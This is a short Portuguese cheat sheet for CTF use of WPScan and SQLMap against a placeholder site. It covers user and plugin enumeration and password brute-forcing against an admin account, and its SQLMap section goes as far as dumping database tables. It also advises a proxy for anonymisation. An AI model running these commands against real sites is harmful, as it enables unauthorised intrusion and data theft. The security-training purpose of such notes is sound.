# WPScan para CTF

WPScan é uma ferramenta para escanear vulnerabilidades em sites WordPress, útil para desafios de CTF.

## Instalação
### Via APT
```bash
sudo apt update && sudo apt install wpscan
```

### Via Git
```bash
git clone https://github.com/wpscanteam/wpscan.git
cd wpscan
bundle install && rake install
```

## Uso Essencial para CTF
### Enumerar Usuários
```bash
wpscan --url http://alvo.com --enumerate u
```

### Descobrir Plugins Vulneráveis
```bash
wpscan --url http://alvo.com --enumerate p --plugins-detection mixed
```

### Testar Senhas de Usuários
```bash
wpscan --url http://alvo.com --passwords wordlist.txt --usernames admin
```

### Verificar Temas Vulneráveis
```bash
wpscan --url http://alvo.com --enumerate t
```

### Dumpar Bancos de Dados, Tabelas e Colunas
Se o site for vulnerável a SQL Injection, é possível extrair informações do banco de dados com o SQLMap.

#### Identificar Vulnerabilidade SQLi
```bash
sqlmap -u "http://alvo.com/index.php?id=1" --dbs
sqlmap -u "http://alvo.com/index.php?cat=1" --dbs
sqlmap -u "http://alvo.com/index.php?page=1" --dbs
sqlmap -u "http://alvo.com/index.php?produto=1" --dbs
sqlmap -u "http://alvo.com/index.php?noticia=1" --dbs
```

#### Listar Tabelas de um Banco de Dados
```bash
sqlmap -u "http://alvo.com/index.php?id=1" -D nome_do_banco --tables
```

#### Listar Colunas de uma Tabela
```bash
sqlmap -u "http://alvo.com/index.php?id=1" -D nome_do_banco -T nome_da_tabela --columns
```

#### Extrair Dados de uma Tabela
```bash
sqlmap -u "http://alvo.com/index.php?id=1" -D nome_do_banco -T nome_da_tabela -C coluna1,coluna2 --dump
```

## Exemplo Rápido
```bash
wpscan --url http://ctf-site.com --enumerate u,p,t
```

## Observações
- Utilize um proxy para anonimização.
- Verifique sempre os Termos de Serviço antes de realizar testes.
- Apenas use WPScan e SQLMap em sites autorizados.

